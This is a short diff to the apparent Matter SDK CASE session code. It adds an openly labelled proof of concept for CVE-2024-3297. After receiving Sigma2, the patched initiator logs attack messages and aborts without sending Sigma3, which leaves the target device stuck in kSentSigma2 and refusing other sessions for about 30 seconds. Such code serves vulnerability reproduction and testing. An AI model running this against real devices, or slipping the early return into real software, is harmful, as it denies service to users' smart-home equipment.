@@ -1440,6 +1440,27 @@ CHIP_ERROR CASESession::HandleSigma2_and_SendSigma3(System::PacketBufferHandle &
     MATTER_LOG_METRIC_END(kMetricDeviceCASESessionSigma1, err);
     SuccessOrExit(err);
 
+    // ============================================================
+    // ATTACK: CVE-2024-3297 - DeeDoS via CASE Session Exhaustion
+    // ============================================================
+    // Simulates attacker behavior:
+    //   1. Attacker sends Sigma1 (initiates CASE)
+    //   2. Device responds with Sigma2 (enters kSentSigma2)
+    //   3. Attacker DROPS - never sends Sigma3
+    //   4. Device stuck in kSentSigma2 for ~30s timeout
+    //   5. All other Sigma1 requests get BUSY StatusReport
+    // ============================================================
+    ChipLogError(SecureChannel, "========================================================");
+    ChipLogError(SecureChannel, "ATTACK CVE-2024-3297: Received Sigma2 from device");
+    ChipLogError(SecureChannel, "ATTACK: NOT sending Sigma3 - aborting to lock device");
+    ChipLogError(SecureChannel, "ATTACK: Device is now stuck in kSentSigma2 state");
+    ChipLogError(SecureChannel, "ATTACK: All new CASE sessions will get BUSY response");
+    ChipLogError(SecureChannel, "========================================================");
+    return CHIP_ERROR_CONNECTION_ABORTED;
+    // ============================================================
+    // END ATTACK CODE - original SendSigma3 below is unreachable
+    // ============================================================
+
     MATTER_LOG_METRIC_BEGIN(kMetricDeviceCASESessionSigma3);
     err = SendSigma3a();
     if (CHIP_NO_ERROR != err)
